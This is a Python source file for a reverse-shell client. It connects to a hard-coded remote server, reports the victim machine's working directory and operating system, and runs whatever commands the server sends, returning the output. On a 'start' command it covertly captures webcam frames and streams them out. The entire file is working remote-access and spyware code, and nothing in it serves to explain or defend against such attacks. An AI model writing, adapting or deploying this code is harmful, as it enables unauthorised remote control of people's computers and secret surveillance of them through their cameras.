import socket  # For network (client-server) communication.
import os  # For handling OS executions.
import subprocess  # For executing system commands.
import cv2  # For recording the video.
import threading  # For recording the video in a different thread.
import platform  # We use this to get the OS of the target (client).

SERVER_HOST = "169.254.193.170"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, you can adjust this.
SEPARATOR = "<sep>"

# Create the socket object.
s = socket.socket()
# Connect to the server.
s.connect((SERVER_HOST, SERVER_PORT))

# Get the current directory and OS and send them to the server.
cwd = os.getcwd()
targets_os = platform.system()
s.send(cwd.encode())
s.send(targets_os.encode())

# Function to record and send the video.
def record_video():
    global cap
    cap = cv2.VideoCapture(1)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(4, byteorder='little'))
        s.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()

while True:
    # Receive the command from the server.
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # If the command is exit, break out of the loop.
        break
    elif command.lower() == "start":
        # Start recording video in a separate thread.
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        output = "Video recording started."
        print(output)
    else:
        # Execute the command and retrieve the results.
        output = subprocess.getoutput(command)
        # Get the current working directory as output.
        cwd = os.getcwd()
        # Send the results back to the server.
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())

# Close client connection.
s.close()
